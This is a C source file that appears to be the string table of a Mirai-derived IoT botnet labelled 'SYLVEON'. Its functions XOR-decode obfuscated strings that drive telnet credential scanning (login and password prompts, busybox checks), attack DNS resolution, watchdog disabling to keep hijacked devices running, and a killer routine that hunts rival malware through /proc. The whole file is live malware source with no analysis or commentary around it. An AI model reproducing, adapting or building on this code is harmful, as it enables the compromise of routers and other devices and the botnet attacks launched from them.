#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeadbeef;
uint32_t table_key2 = 0x85dab8bf;
uint32_t table_key3 = 0xdeedeebf;
uint32_t table_key4 = 0xdeabbeaf;
uint32_t table_key5 = 0xdbbd45bf;
uint32_t table_key6 = 0x246584ef;
uint32_t table_key7 = 0x85bfe8bf;
uint32_t table_key8 = 0xd68395bf;
uint32_t table_key9 = 0xdbaaaaaf;
uint32_t table_key10 = 0xdaabeef;

struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_EXEC_SUCCESS, "\x1B\x7A\x16\x3F\x3B\x3C\x3F\x35\x34\x7A\x33\x29\x7A\x36\x33\x29\x2E\x3F\x34\x33\x34\x3D\x7A\x35\x34\x7A\x23\x35\x2F\x28\x7A\x3E\x3F\x2C\x33\x39\x3F\x5A", 38);
    add_entry(TABLE_SCAN_CB_PORT, "\x06\x03", 2); // 23641

    add_entry(TABLE_ATK_RESOLVER, "\x75\x3F\x2E\x39\x75\x28\x3F\x29\x35\x36\x2C\x74\x39\x35\x34\x3C\x5A", 17);
    add_entry(TABLE_ATK_NSERV, "\x34\x3B\x37\x3F\x29\x3F\x28\x2C\x3F\x28\x7A\x5A", 12);

    add_entry(TABLE_MISC_RAND, "\x3B\x38\x39\x3E\x3F\x3C\x3D\x32\x33\x30\x31\x36\x37\x34\x35\x2A\x2B\x28\x29\x2E\x2F\x2C\x2D\x6A\x6B\x68\x69\x6E\x6F\x6C\x6D\x62\x5A", 33);

    add_entry(TABLE_SCAN_SHELL, "\x29\x32\x3F\x36\x36\x5A", 6); // shell
    add_entry(TABLE_SCAN_ENABLE, "\x3F\x34\x3B\x38\x36\x3F\x5A", 7); // enable
    add_entry(TABLE_SCAN_SYSTEM, "\x29\x23\x29\x2E\x3F\x37\x5A", 7); // system
    add_entry(TABLE_SCAN_SH, "\x29\x32\x5A", 3); // sh
    add_entry(TABLE_SCAN_QUERY, "\x75\x38\x33\x34\x75\x38\x2F\x29\x23\x38\x35\x22\x7A\x09\x03\x16\x0C\x1F\x15\x14\x5A", 21); // /bin/busybox SYLVEON
    add_entry(TABLE_SCAN_RESP, "\x09\x03\x16\x0C\x1F\x15\x14\x60\x7A\x3B\x2A\x2A\x36\x3F\x2E\x7A\x34\x35\x2E\x7A\x3C\x35\x2F\x34\x3E\x5A", 26); // SYLVEON: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x34\x39\x35\x28\x28\x3F\x39\x2E\x5A", 9); // ncorrect
    add_entry(TABLE_SCAN_OGIN, "\x35\x3D\x33\x34\x5A", 5); // ogin
    add_entry(TABLE_SCAN_ENTER, "\x3F\x34\x2E\x3F\x28\x5A", 6); // enter
    add_entry(TABLE_SCAN_ASSWORD, "\x3B\x29\x29\x2D\x35\x28\x3E\x5A", 8); // assword
    add_entry(TABLE_SCAN_LINUXSHELL, "\x36\x33\x34\x2F\x22\x29\x32\x3F\x36\x36\x5A", 11); // linuxshell

    add_entry(TABLE_KILLER_MAPS, "\x75\x37\x3B\x2A\x29\x5A", 6); // /maps
    add_entry(TABLE_KILLER_PROC, "\x75\x2A\x28\x35\x39\x75\x5A", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x75\x3F\x22\x3F\x5A", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x75\x3C\x3E\x5A", 4); // /fd
    add_entry(TABLE_KILLER_TCP, "\x75\x2A\x28\x35\x39\x75\x34\x3F\x2E\x75\x2E\x39\x2A\x5A", 14); // / /proc/net/tcp

        
    add_entry(TABLE_MISC_RAND, "\x53\x05\x00\x03\x56\x01\x06\x0D\x0F\x57\x51\x0C\x0A\x12\x53\x50\x07\x0B\x07\x05\x03\x07\x62", 23); 
    add_entry(TABLE_MISC_DOG, "\x4D\x06\x07\x14\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 14); // /dev/watchdog
    add_entry(TABLE_MISC_DOG1, "\x4D\x06\x07\x14\x4D\x0F\x0B\x11\x01\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 19); // /dev/misc/watchdog
    add_entry(TABLE_MISC_DOG2, "\x4D\x06\x07\x14\x4D\x24\x36\x35\x26\x36\x53\x52\x53\x3D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 23); // /dev/FTWDT101_watchdog
    add_entry(TABLE_MISC_DOG3, "\x4D\x06\x07\x14\x4D\x24\x36\x35\x26\x36\x53\x52\x53\x3E\x42\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 24); // /dev/FTWDT101\ watchdog
    add_entry(TABLE_MISC_DOG4, "\x4D\x06\x07\x14\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x52\x62", 15); // /dev/watchdog0
    add_entry(TABLE_MISC_DOG5, "\x4D\x07\x16\x01\x4D\x06\x07\x04\x03\x17\x0E\x16\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 22); // /etc/default/watchdog
    add_entry(TABLE_MISC_DOG6, "\x4D\x11\x00\x0B\x0C\x4D\x15\x03\x16\x01\x0A\x06\x0D\x05\x62", 15); // /sbin/watchdog



    //Strings to Kill
    add_entry(TABLE_KILLER_ROOT, "\x75\x28\x35\x35\x2E\x75\x5A", 7); // /root/
    add_entry(TABLE_KILLER_TMP, "\x75\x2E\x37\x2A\x75\x5A", 6); // /tmp/
    add_entry(TABLE_KILLER_HOME, "\x75\x32\x35\x37\x3F\x75\x5A", 7); // /home/
    add_entry(TABLE_KILLER_VAR, "\x75\x2C\x3B\x28\x75\x5A", 6); // /var/
    add_entry(TABLE_KILLER_MNT, "\x75\x37\x34\x2E\x75\x5A", 6); // /mnt/

    add_entry(TABLE_KILLER_CMD, "\x75\x39\x37\x3E\x36\x33\x34\x3F\x5A", 9); // /cmdline
    add_entry(TABLE_KILLER_KILL1, "\x0A\x08\x05\x09\x1F\x0E\x05\x14\x1B\x17\x1F\x5A", 12); // PR_SET_NAME
    add_entry(TABLE_KILLER_UPX, "\x0F\x0A\x02\x7B\x5A", 5); // UPX!


    add_entry(XOR_MEM_NETSLINK, "\xDA\x91\x90\x83\xDA\x9B\x90\x81\x86\x99\x9C\x9B\x9E\xDA\xF5", 15); // /dev/netslink/
    add_entry(XOR_MEM_QBOT, "\xA6\xA1\xB1\xF5", 4); // STD
    add_entry(XOR_MEM_DEMON, "\xDA\x80\x86\x87\xDA\x97\x9C\x9B\xDA\x85\x8C\x81\x9D\x9A\x9B\xF5", 16); // /usr/bin/python
    add_entry(XOR_MEM_UPX, "\xA0\xA5\xAD\xD4\xF5", 5); // UPX!


}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        //printf("(hito/table) tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        //printf("(hito/table) tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        //printf("(hito/table) tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff,
            k5 = table_key2 & 0xff,
            k6 = (table_key2 >> 8) & 0xff,
            k7 = (table_key2 >> 16) & 0xff,
            k8 = (table_key2 >> 24) & 0xff,
            k9 = table_key3 & 0xff,
            k10 = (table_key3 >> 8) & 0xff,
            k11 = (table_key3 >> 16) & 0xff,
            k12 = (table_key3 >> 24) & 0xff,
            k13 = table_key4 & 0xff,
            k14 = (table_key4 >> 8) & 0xff,
            k15 = (table_key4 >> 16) & 0xff,
            k16 = (table_key4 >> 24) & 0xff,
            k17 = table_key5 & 0xff,
            k18 = (table_key5 >> 8) & 0xff,
            k19 = (table_key5 >> 16) & 0xff,
            k20 = (table_key5 >> 24) & 0xff,
            k21 = table_key6 & 0xff,
            k22 = (table_key6 >> 8) & 0xff,
            k23 = (table_key6 >> 16) & 0xff,
            k24 = (table_key6 >> 24) & 0xff,
            k25 = table_key7 & 0xff,
            k26 = (table_key7 >> 8) & 0xff,
            k27 = (table_key7 >> 16) & 0xff,
            k28 = (table_key7 >> 24) & 0xff,
            k29 = table_key8 & 0xff,
            k30 = (table_key8 >> 8) & 0xff,
            k31 = (table_key8 >> 16) & 0xff,
            k32 = (table_key8 >> 24) & 0xff,
            k33 = table_key9 & 0xff,
            k34 = (table_key9 >> 8) & 0xff,
            k35 = (table_key9 >> 16) & 0xff,
            k36 = (table_key9 >> 24) & 0xff,
            k37 = table_key10 & 0xff,
            k38 = (table_key10 >> 8) & 0xff,
            k39 = (table_key10 >> 16) & 0xff,
            k40 = (table_key10 >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
        val->val[i] ^= k5;
        val->val[i] ^= k6;
        val->val[i] ^= k7;
        val->val[i] ^= k8;
        val->val[i] ^= k9;
        val->val[i] ^= k10;
        val->val[i] ^= k11;
        val->val[i] ^= k12;
        val->val[i] ^= k13;
        val->val[i] ^= k14;
        val->val[i] ^= k15;
        val->val[i] ^= k16;
        val->val[i] ^= k17;
        val->val[i] ^= k18;
        val->val[i] ^= k19;
        val->val[i] ^= k20;
        val->val[i] ^= k21;
        val->val[i] ^= k22;
        val->val[i] ^= k23;
        val->val[i] ^= k24;
        val->val[i] ^= k25;
        val->val[i] ^= k26;
        val->val[i] ^= k27;
        val->val[i] ^= k28;
        val->val[i] ^= k29;
        val->val[i] ^= k30;
        val->val[i] ^= k31;
        val->val[i] ^= k32;
        val->val[i] ^= k33;
        val->val[i] ^= k34;
        val->val[i] ^= k35;
        val->val[i] ^= k36;
        val->val[i] ^= k37;
        val->val[i] ^= k38;
        val->val[i] ^= k39;
        val->val[i] ^= k40;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
